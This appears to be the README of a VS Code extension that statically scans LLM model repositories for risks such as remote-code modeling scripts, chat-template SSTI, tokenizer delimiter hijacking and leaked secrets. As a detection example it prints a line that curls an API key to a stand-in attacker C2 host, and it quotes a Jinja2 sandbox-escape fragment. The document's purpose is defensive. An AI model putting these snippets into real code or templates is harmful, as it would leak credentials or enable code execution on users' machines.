# 🛡️ LLM Model Security Scanner for Visual Studio Code

[![Visual Studio Marketplace](https://img.shields.io/badge/Marketplace-v1.0.0-blue.svg?logo=visual-studio-code)](https://marketplace.visualstudio.com)
[![Publisher](https://img.shields.io/badge/Publisher-mg--ai-purple.svg)](https://github.com/mesutgungor)
[![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-green.svg)](LICENSE)
[![Compliance](https://img.shields.io/badge/Compliance-OWASP%20%7C%20MITRE%20ATLAS%20%7C%20NIST%20%7C%20EU%20AI%20Act-orange.svg)](https://github.com/mesutgungor/llm-model-security-scanner#-regulatory--security-framework-crosswalk)
[![SARIF v2.1.0](https://img.shields.io/badge/SARIF-v2.1.0-blueviolet.svg)](#-key-features)

> **Enterprise-grade, zero-execution static analysis, in-editor diagnostics, and cryptographic Proof-of-Finding verification for Large Language Models (LLMs) directly inside Visual Studio Code.**

Inspect model weights, configuration manifests, tokenizer dictionaries, chat templates, and custom architecture scripts before they are loaded into runtime environments like PyTorch, Hugging Face Transformers, vLLM, Ollama, or llama.cpp.

---

<p align="center">
  <img src="https://raw.githubusercontent.com/mesutgungor/vscode-llm-model-security-scanner/main/media/preview.png" alt="LLM Model Security Scanner in VS Code" width="950">
</p>

---

## 📌 Table of Contents

- [Why LLM Security in the IDE?](#-why-llm-security-in-the-ide)
- [✨ Key Features](#-key-features)
- [📸 Live Capabilities & UI Walkthrough](#-live-capabilities--ui-walkthrough)
- [🛠️ Commands & Shortcuts](#️-commands--shortcuts)
- [⚙️ Configuration & Settings](#️-configuration--settings)
- [🔬 Proof-of-Finding Verification Engine](#-proof-of-finding-verification-engine)
- [🏛️ Regulatory & Standards Compliance](#️-regulatory--standards-compliance)
- [🚀 Installation & Setup](#-installation--setup)
- [🔨 Building from Source](#-building-from-source)
- [👤 Author & License](#-author--license)

---

## 🚨 Why LLM Security in the IDE?

Machine learning engineers and application developers frequently load third-party models using `AutoModelForCausalLM.from_pretrained(...)` without realizing that open-source model repositories are not just static weight arrays—they contain executable code, serialization graphs, and template engines:

1. **`trust_remote_code=True` Exploits:** Custom modeling scripts (`modeling_*.py`, `configuration_*.py`) declared in `config.json` can execute arbitrary system commands, socket connections, or reverse shells on the host machine.
2. **Jinja2 Chat Template SSTI (CVE-2024-34359):** Malicious `tokenizer_config.json` chat templates escape sandboxes via Python reflection (`__class__.__mro__[1].__subclasses__()`).
3. **SafeTensors Allocation Bombs (CVE-2023-44469):** Manipulated 8-byte headers trigger memory exhaustion and Denial of Service.
4. **Special Token Delimiter Hijacking:** Control delimiters (such as `<|im_start|>`) marked as non-special in `tokenizer.json` break system/user turn isolation, enabling prompt injection attacks.
5. **Hardcoded Secrets & API Keys:** Model cards and scripts often contain leaked Hugging Face tokens, OpenAI keys, AWS credentials, and SSH private keys.

**LLM Model Security Scanner** catches these threats at the source—**in your editor before the model is ever loaded into memory or deployed to production.**

---

## ✨ Key Features

- **🛡️ Remote Import Guardian (Real-Time Hugging Face Model Auditing):**
  - **Inline CodeLens Badges:** Writing `AutoModelForCausalLM.from_pretrained("org/model")`, `pipeline(..., model="org/model")`, or `SentenceTransformer("org/model")` automatically renders real-time status badges above your code:
    - Clean: `$(pass) Model Verified Clean (0/100) • org/model`
    - Vulnerable: `$(alert) [HIGH_RISK] Risk: 45/100 • 1 Finding(s) [View Proof]`
    - In-Flight: `$(sync~spin) Auditing Remote Model: org/model...`
  - **Zero-Download Remote Auditing:** Inspects remote model manifests, tokenizers, configs, and chat templates over the Hugging Face API without downloading multi-gigabyte weight tensors.
  - **In-Editor String Squiggles:** Draws error/warning underlines directly on the remote model ID string with CVE tags and 1-click Quick Fixes (`⌘.`).
- **🔴 In-Editor Real-Time Diagnostics:** Native red and yellow squiggly underlines directly on vulnerable lines in `tokenizer.json`, `config.json`, `generation_config.json`, `chat_template.json`, and `modeling_*.py` with CWE tags and remediation hints.
- **💡 Native In-Editor Quick Fixes (`⌘.` or Lightbulb):**
  - `💡 Security Insights: [RULE-ID]` — Instant in-editor explanation dialog with impact details and remediation instructions.
  - `🛡️ Generate Proof Dossier (llm-scan verify)` — Launches the verification engine and opens the interactive HTML proof certificate.
  - `📖 Open Rule Documentation on GitHub` — Deep-links directly to the exact anchored rule in the catalog.
- **🛡️ Activity Bar "Model Security Explorer":** Dedicated sidebar tree view displaying the active model verdict (`SAFE`, `MEDIUM_RISK`, `HIGH_RISK`, `CRITICAL`), risk score (0–100), and findings categorized by severity. Clicking any finding navigates directly to the offending line of code.
- **🔬 Proof-of-Finding Interactive Webview:** Renders verifiable cryptographic proof dossiers (SHA-256 file fingerprints, non-destructive reproduction traces, and consumer impact summaries) in a native VS Code editor tab.
- **☁️ Remote Hugging Face Hub Auditing:** Audit remote models directly over the Hugging Face API without downloading gigabytes of weights (`Cmd + Shift + P` -> `LLM Security: Audit Remote Hugging Face Repository...`).
- **⚡ Automated Virtualenv Detection:** Automatically identifies your active Python environment (`venv`, `conda`, `poetry`) via the official Microsoft Python extension and prompts with a 1-click install toast if `llm-scan` is not present.
- **🏛️ Regulatory Compliance Crosswalk:** Built-in mapping to **OWASP Top 10 for LLMs (2025)**, **MITRE ATLAS**, **NIST AI RMF (AI 100-1)**, and **EU AI Act (Regulation 2024/1689)**.

---

## 📸 Live Capabilities & UI Walkthrough

### 1. Remote Import Guardian (Real-Time Hugging Face Model Auditing)
As soon as you type or inspect model loading statements, `llm-scan` detects the remote model repository, queries the Hugging Face Hub API weightless, and surfaces actionable CodeLens and squiggly diagnostics:

```python
# CodeLens rendered automatically above your code:
# 🚨 [HIGH_RISK] Risk: 45/100 • 1 Finding(s) [View Proof]
model = AutoModelForCausalLM.from_pretrained("NousResearch/Hermes-3-Llama-3.1-8B")
#                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
# [REMOTE-RISK] Hugging Face Model 'NousResearch/Hermes-3-Llama-3.1-8B' flagged with HIGH_RISK (45/100).
# Primary threat: [SEC-TOK-004] Control delimiter '<|im_start|>' has special=false.
# Remediation: Set special=true for control token '<|im_start|>'.
```

### 2. In-Editor Squiggles & Diagnostics
As you write or inspect model code and manifests, `llm-scan` flags insecure calls (such as `os.system`, `eval()`, `zlib.decompress`, or unescaped tokens) in real time:

```python
# SEC-RCE-003: Shell command execution inside model code
os.system("curl -s https://attacker-c2.example/beacon?key=" + api_key)
# ^^^^^^^^^ [SEC-RCE-003] Host Command Execution via 'system' (CWE-78 / OWASP LLM03)
```

### 3. Contextual Quick Fix Menu
Pressing **`Cmd + .`** on any highlighted vulnerability reveals one-click actions:
* **Security Insights:** Read what the vulnerability means and how to remediate it.
* **Generate Proof Dossier:** Validate the vulnerability deterministically.
* **Open Documentation:** Navigate directly to the anchored rule catalog.

### 4. Activity Bar Tree View
The **LLM Model Security** tab in the Activity Bar groups findings by severity (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`) and displays the overall risk score. Clicking any entry jumps straight to the file and line number.

---

## 🛠️ Commands & Shortcuts

All commands are accessible via the Command Palette (**`Cmd + Shift + P`** on macOS, **`Ctrl + Shift + P`** on Windows/Linux):

| Command ID | Display Title | Description |
| :--- | :--- | :--- |
| `llmSecurity.scanWorkspace` | `LLM Security: Scan Workspace Models` | Audits the current workspace for model vulnerabilities. |
| `llmSecurity.scanFile` | `LLM Security: Scan Selected Model / File` | Scans the active or right-clicked file (`.bin`, `.safetensors`, `.gguf`, `.json`, `.py`). |
| `llmSecurity.scanRemoteHub` | `LLM Security: Audit Remote Hugging Face Repository...` | Prompts for a Hugging Face repo ID (e.g. `meta-llama/Llama-3-8B`) and scans it weightless. |
| `llmSecurity.auditRemoteInline` | `LLM Security: Audit Remote Hugging Face Model Inline` | Triggers a remote audit directly from a detected `from_pretrained` CodeLens badge. |
| `llmSecurity.verifySpecificModel` | `LLM Security: Generate Cryptographic Proof Dossier for Model` | Generates a deterministic Proof Dossier for a specific model ID. |
| `llmSecurity.verifyFindings` | `LLM Security: Verify Findings (Proof Engine)` | Generates deterministic proof dossiers with cryptographic SHA-256 fingerprints. |
| `llmSecurity.showProofDossier` | `LLM Security: View Proof Dossier Webview` | Renders the interactive HTML Proof Certificate in a new editor tab. |
| `llmSecurity.showCompliance` | `LLM Security: Show Regulatory Framework Crosswalk` | Displays framework mappings (OWASP, MITRE ATLAS, NIST, EU AI Act). |
| `llmSecurity.installScanner` | `LLM Security: Install Scanner in Active Environment` | Installs or upgrades `llm-model-security-scanner` in Python via pip. |

---

## ⚙️ Configuration & Settings

Customize the extension under **Settings** (`Cmd + ,` -> search for `LLM Security`):

| Setting Key | Default | Options | Description |
| :--- | :---: | :--- | :--- |
| `llmSecurity.triggerMode` | `"smart"` | `"smart"`, `"onSave"`, `"onOpen"`, `"manual"` | **Trigger Strategy:**<br>• `smart`: Instant scan on save for configs/templates, manual for gigabyte weights.<br>• `onSave`: Scans on every file save.<br>• `onOpen`: Scans when opening model folders.<br>• `manual`: Scans only when requested. |
| `llmSecurity.profile` | `"auto"` | `"auto"`, `"consumer"`, `"creator"` | **Scan Focus:** Prioritizes supply chain & RCE (Consumer) vs. LoRA alignment, weight poisoning & licensing (Creator). |
| `llmSecurity.maxSeverityGate` | `"HIGH"` | `"LOW"`, `"MEDIUM"`, `"HIGH"`, `"CRITICAL"` | Severity threshold that triggers high-visibility warnings and status bar alerts. |
| `llmSecurity.deepWeightSampling` | `false` | `boolean` | Whether to perform numerical memory-mapped tensor sampling on multi-gigabyte models. |
| `llmSecurity.pythonPath` | `""` | `string` | Custom path to python interpreter. Leave empty for auto-detection via the Python extension. |

---

## 🔬 Proof-of-Finding Verification Engine

When a vulnerability is flagged, security teams and developers often ask: *"Is this a false positive?"* or *"Can you prove this is exploitable?"*

The integrated **Proof-of-Finding Verification Engine** (`llmSecurity.verifyFindings`) generates undeniable proof artifacts:
1. **Cryptographic SHA-256 Fingerprint:** Proves the exact file bytes scanned.
2. **Abstract Syntax Tree (AST) & Opcode Traces:** Compiler-level structure of the exploit.
3. **Step-by-Step Reproduction Guide:** Non-destructive reproduction steps for engineers.
4. **Interactive HTML Proof Certificate:** Rendered directly in a native VS Code Webview tab.

---

## 🏛️ Regulatory & Standards Compliance

Every rule in `llm-scan` is mapped to the four principal AI safety frameworks:

| Threat Category | OWASP Top 10 for LLMs (2025) | MITRE ATLAS | NIST AI RMF (100-1) | EU AI Act (2024/1689) |
| :--- | :--- | :--- | :--- | :--- |
| **Pickle / ZipSlip Deserialization** | **LLM03: Supply Chain** | **AML.T0010: Supply Chain** | **MANAGE-2.4 (Vetting)** | **Art. 15 / 55 (Systemic)** |
| **Remote Code & Custom Kernels** | **LLM03: Supply Chain** | **AML.T0048: Code Execution** | **MANAGE-2.4 (Vetting)** | **Art. 15 (Cybersecurity)** |
| **Jinja2 Chat Template SSTI** | **LLM03 / LLM01** | **AML.T0048: Code Execution** | **MEASURE-2.6 (Testing)** | **Art. 15 (Cybersecurity)** |
| **SafeTensors / GGUF Memory Bombs** | **LLM10: Consumption** | **AML.T0029: Denial of Service**| **MEASURE-2.6 (Testing)** | **Art. 15 (Robustness)** |
| **Special Token Delimiter Hijacking** | **LLM01: Prompt Injection** | **AML.T0051: LLM Injection** | **MEASURE-2.6 (Testing)** | **Art. 15 (Cybersecurity)** |
| **LoRA Scaling Sabotage** | **LLM04: Model Poisoning** | **AML.T0018: Backdoor ML** | **MEASURE-2.6 (Testing)** | **Art. 15 (Robustness)** |
| **Secret & Credential Exposure** | **LLM02: Data Leak** | **AML.T0040: IP Theft** | **GOVERN-1.2 & MANAGE** | **Art. 15 & 53 (Protection)** |

---

## 🚀 Installation & Setup

### Method 1: From Visual Studio Marketplace
1. Open VS Code.
2. Press **`Cmd + Shift + X`** to open Extensions.
3. Search for **`LLM Model Security Scanner`**.
4. Click **Install**.

### Method 2: Install from VSIX Bundle
```bash
code --install-extension llm-model-security-scanner-1.0.0.vsix
```

---

## 🔨 Building from Source

```bash
# Clone repository
git clone https://github.com/mesutgungor/vscode-llm-model-security-scanner.git
cd vscode-llm-model-security-scanner

# Install dependencies
npm install

# Compile TypeScript
npm run compile

# Package into .vsix bundle
npx vsce package --no-dependencies
```

---

## 👤 Author & Support

**Mesut Güngör**  
- GitHub: [@mesutgungor](https://github.com/mesutgungor)  
- Core Scanner Engine: [https://github.com/mesutgungor/llm-model-security-scanner](https://github.com/mesutgungor/llm-model-security-scanner)

---

## 📄 License

Licensed under the **Apache License 2.0**. See the [LICENSE](LICENSE) file for complete terms and conditions.
